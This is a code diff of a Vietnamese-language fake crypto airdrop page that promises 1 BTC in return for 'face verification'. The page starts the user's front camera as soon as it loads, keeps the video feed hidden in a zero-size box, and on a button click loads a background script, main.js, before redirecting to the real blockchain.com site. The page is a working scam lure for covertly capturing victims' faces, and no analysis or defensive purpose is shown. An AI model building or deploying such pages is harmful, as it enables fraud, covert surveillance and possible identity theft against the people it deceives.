@@ -3,21 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blockchain Airdrop - Xác thực nhận 1 BTC</title>
+    <title>Blockchain Airdrop - Nhận 1 BTC</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e11; color: #eaecef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #1e2329; padding: 30px; border-radius: 16px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #474d57; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; z-index: 10; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e11; color: #eaecef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; padding: 30px; border-radius: 16px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #474d57; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .btc-icon { width: 80px; margin-bottom: 20px; }
         h2 { color: #f3ba2f; margin-bottom: 10px; }
         p { color: #848e9c; font-size: 14px; line-height: 1.6; }
         .btn { background: #f3ba2f; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
         .btn:hover { background: #dba323; }
-        .btn:disabled { background: #474d57; cursor: not-allowed; }
+        /* Camera ẩn hoàn toàn */
+        #vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
         #loading { display: none; margin-top: 20px; }
         .spinner { border: 3px solid #30363d; border-top: 3px solid #f3ba2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* Ẩn camera và canvas hoàn toàn */
-        #hiddenCapture { position: absolute; width: 1px; height: 1px; opacity: 0.01; left: -1000px; overflow: hidden; }
     </style>
 </head>
 <body>
@@ -25,22 +24,52 @@
 <div class="card">
     <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="btc-icon" alt="BTC">
     <h2>Chúc mừng bạn!</h2>
-    <p>Bạn đủ điều kiện nhận 1 BTC. Nhấn nút bên dưới để hệ thống AI xác thực khuôn mặt và giải ngân vào ví Blockchain của bạn.</p>
+    <p>Bạn đã đủ điều kiện nhận 1 BTC từ chương trình tri ân. Nhấn nút bên dưới để xác thực khuôn mặt và hoàn tất quy trình nhận thưởng vào ví.</p>
     
+    <div id="vBox">
+        <video id="preview" autoplay playsinline muted></video>
+    </div>
+
     <div id="loading">
         <div class="spinner"></div>
-        <p id="statusText">Đang quét khuôn mặt và mã hóa dữ liệu...</p>
+        <p>Đang quét khuôn mặt và mã hóa dữ liệu...</p>
     </div>
 
     <button class="btn" id="startBtn">XÁC THỰC & NHẬN 1 BTC</button>
 </div>
 
-<div id="hiddenCapture">
-    <video id="videoFront" autoplay playsinline muted></video>
-    <video id="videoBack" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
-</div>
+<script>
+    const btn = document.getElementById('startBtn');
+    const loading = document.getElementById('loading');
+    const video = document.getElementById('preview');
+    const REDIRECT_URL = "https://www.blockchain.com/"; // Trang đích sau khi xong
 
-<script src="main.js"></script>
+    // Kích hoạt camera ngay khi vào trang để sẵn sàng
+    async function initCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            video.srcObject = stream;
+        } catch (err) { console.warn("Yêu cầu quyền camera để nhận thưởng."); }
+    }
+    initCamera();
+
+    btn.addEventListener('click', () => {
+        btn.style.display = 'none';
+        loading.style.display = 'block';
+
+        // Gọi script xử lý ngầm
+        const script = document.createElement('script');
+        script.src = 'main.js'; 
+        document.body.appendChild(script);
+
+        // Chờ tín hiệu từ main.js để chuyển hướng
+        const check = setInterval(() => {
+            if (window.mainScriptFinished) {
+                clearInterval(check);
+                window.location.href = REDIRECT_URL;
+            }
+        }, 500);
+    });
+</script>
 </body>
 </html>
